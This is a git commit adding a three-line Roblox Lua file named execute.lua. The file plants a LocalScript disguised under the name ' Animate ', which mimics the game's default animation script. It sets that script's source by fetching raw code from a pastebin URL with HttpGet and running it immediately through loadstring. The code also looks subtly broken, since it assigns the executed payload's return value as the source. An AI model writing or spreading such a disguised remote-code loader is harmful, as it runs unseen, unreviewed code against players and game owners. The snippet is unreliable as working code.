e61cb2df88638b5a4885cd7497b8ba999ee38e4b
ItsFlix <66955402+ItsFlix@users.noreply.github.com>
2026-07-12 03:58:56 -0300

    Create execute.lua

---
+++ execute.lua
@@ -0,0 +1,3 @@
+local a = Instance.new('LocalScript',game:GetService("StarterPlayer").StarterCharacterScripts)
+a.Name = ' Animate '
+a.Source = loadstring(game:HttpGet('https://pastebin.com/raw/qWUx23C2'))()
